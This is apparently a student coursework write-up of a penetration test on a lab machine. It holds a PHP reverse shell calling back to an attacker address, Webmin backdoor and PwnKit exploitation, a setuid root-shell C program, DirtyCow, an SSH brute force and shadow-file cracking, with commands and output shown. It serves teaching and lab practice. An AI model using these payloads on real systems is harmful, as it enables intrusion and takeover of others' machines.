# CF Coursework 2

## Remote Enumeration

### Initial NMAP Scan of Whole Network
![[initial-nmap.png]]
- Nothing too interesting from 10.1.26.1 - 10.1.26.5
- 10.1.26.30 has some interesting ports open so we will do a more detailed scan of that machine

### Nmap Scan of 10.1.26.30
- -sC to run default scripts 
- -sV to enumerate versions

![[26.30-nmap.png]]

- This shows some interesting things
- We have ssh running which could be brute forced if the password isn't strong enough
- Apache 2.4.18 which could possibly be exploited
- An nfs share we can mount to upload files to the server
- MiniServ 1.89 which can be exploited to get a shell

### Looking at the Apache Server
![[apache-default-page.png]]

- Nothing interesting on the index page so use feroxbuster to enumerate resources on the server

### Feroxbuster
- Search for html, php and txt files

![[feroxbuster.png]]
- Nothing of interest was found - seems just like a default Apache server

## Initial Access

### Method 1 - Webmin
- From nmap we can see we have webmin 1.890 running on port 10000
- This version is vulnerable to a backdoor exploit that we can run using metasploit

![[webmin-search.png]]
- We can then setup the exploit with the options for the victim server and run the exploit

![[webmin-setup.png]]
![[webmin-run.png]]

- This gives us a root shell on the server, granted not the best shell in the world

#### Upgrading the shell
- To make this shell more usable we can utilise the metasploit feature meterpreter shell

![[meterpreter-shell.png]]

- We now have a meterpreter shell!
- Running sysinfo shows us we have a Ubuntu 16.04 box running with an old linux kernel - this could open some doors for a kernel exploit priv esc
- Also note we arent on amd64 we are on i686 which is 32bit - this could pose a problem for compiling some of our exploits

![[sysinfo.png]]

- we can upgrade our shell further by using the python pty library
- and export TERM=xterm will give you the ability to clear the screen
![[python-pty.png]]

- This webmin exploit also allows us to log directly in as root

### Method 2 - NFS

- We can mount the nfs share we discovered during the nmap and acces the files on the webserver
![[mount-nfs.png]]

- We can then upload a php reverse shell to the webserver into /var/www/html
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.1.26.20/1234 0>&1'");
?>
```

- Set up listener on attacker machine and go to http://10.1.26.30/rev.php to run the reverse shell
![[php-rev-shell.png]]
- Now we have a shell as the www-data user

### Method 3 - Brute Force SSH
- We can use hydra to brute force ssh on the server
![[hydra.png]]
- From this we see we have 2 main users 
	- jennifer: 123456
	- root: dragon
- We can now login as either root or jennifer 


## Local Enumeration 

### Linpeas
- An easy way to check for some easily exploitable features is running the linpeas script
``` bash
curl -L https://github.com/carlospolop/PEASSng/releases/latest/download/linpeas.sh | sh
```

- Linpeas tells us that the machine is vulnerable to CVE-2021-4043 or PwnKit - a polkit exploit
- It also says its potentially vulnerable to CVE-2022-2588 however after looking into the CVE it does not seem to work with the kernel the victim box is running
- We also see that we are able to read the /etc/shadow file which we can try and crack with john


## Priv Esc

### Method 1
- Crack root password using john
- We have to combine the /etc/passwd entry for root and /etc/shadow entry for root 

```
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ unshadow passwd.txt shadow.txt > unshadowed.txt
Created directory: /home/kali/.john
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ cat unshadowed.txt
root:$5$BN8CmDdqe6QVOQkm$tuYdx49auWDZW3JZzsN9GKgriNTSAlSc/Js723Zvvv8:0:0:root:/root:/bin/bash
```

- Run john to crack root the password 
```
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ john --wordlist=/usr/share/wordlists/fasttrack.txt unshadowed.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragon           (root)
1g 0:00:00:00 DONE (2023-03-06 15:52) 8.333g/s 1850p/s 1850c/s 1850C/s Spring2017..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- We can now login as root

### Method 2 - PwnKit (CVE-2021-4034)

- Run john to crack jennifers password
- We need to login as jennifer as www-data cant compile a binary
```
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ john --wordlist=/usr/share/wordlists/fasttrack.txt jenunshadow.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (jennifer)
1g 0:00:00:00 DONE (2023-03-06 16:38) 10.00g/s 2220p/s 2220c/s 2220C/s Spring2017..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
- And this shows jennifer's password is **123456**

- Once we have logged in as jennifer we can download the polkit exploit and compile it
```
jennifer@srv-99-590:~$ curl https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c > ex.c
<tent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c > pwnkit.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1267  100  1267    0     0   3218      0 --:--:-- --:--:-- --:--:--  3223
jennifer@srv-99-590:~$ ls
ls
ex.c
jennifer@srv-99-590:~$ gcc ex.c -o ex
```

- Finally we can run the exploit to get root 
```
jennifer@srv-99-590:~$ ./ex
./ex
# whoami
whoami
root
#
```

### Method 3 - setuid Binary

- As we have access to the nfs share we are able to add the suid bit to any binary we want
- below is the source code that will spawn a root shell
``` c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
	setuid(0);
	system("/bin/bash");
	return 0;
}
```

- We can then compile the code and move it to /var/www/html so we can access it on the attacker machine
- Finally we set the suid bit of the binary and change the owner to root so it always runs as root

```
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ sudo chown root /mnt/nfs/var/www/html/shell                                                     
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ sudo chgrp root /mnt/nfs/var/www/html/shell
┌──(kali㉿kali-99-590)-[~/exploits]
└─$ sudo chmod u+s /mnt/nfs/var/www/html/shell

jennifer@srv-99-590:/var/www/html$ ls -l
total 40
-rw-r--r-- 1 www-data www-data  1267 Mar  6 15:43 cve-2021-4034-poc.c
-rw-r--r-- 1 ubuntu   ubuntu    5489 Mar  6 15:14 exp.php
-rw-r--r-- 1 root     root     11321 Mar  5 00:49 index.html
-rw-r--r-- 1 www-data www-data     0 Mar  6 15:43 pwnkit.c
-rw-r--r-- 1 ubuntu   ubuntu      74 Mar  6 15:11 rev.php
-rwsrwxr-x 1 root     root      7388 Mar  6 17:11 shell
-rw-rw-r-- 1 jennifer jennifer   124 Mar  6 17:11 shell.c
```

- Run the binary on the target machine and you will get a root shell
```
jennifer@srv-99-590:/var/www/html$ ./shell
root@srv-99-590:/var/www/html# whoami
root
root@srv-99-590:/var/www/html#
```


### Method 4 - DirtyCow (CVE-2016-5195)
- This is a well known kernel exploit that originated back in 2016
- Below is a PoC using exploit code from github user gibonacini (https://github.com/gbonacini/CVE-2016-5195) 
- The specific exploit used here overwrites the /etc/passwd file to replace the root password
- For clarity, these PoCs are being performed on an identical VM running locally - not the main victim machine. This is to ensure I don't unintentionally crash the victim machine.
```
ubuntu@kernel-exploit-tests:~/CVE-2016-5195$ make
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
ubuntu@kernel-explout-tests:~/CVE-2016-5195$ ./dcow
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
ubuntu@kernel-exploit-tests:~/CVE-2016-5195$ su -
Password:
root@kernel-exploit-tests:~# whoami
root
root@kernel-exploit-tests:~# id
uid=0(root) gid=0(root) groups=0(root)
root@kernel-explout-tests:~#
```
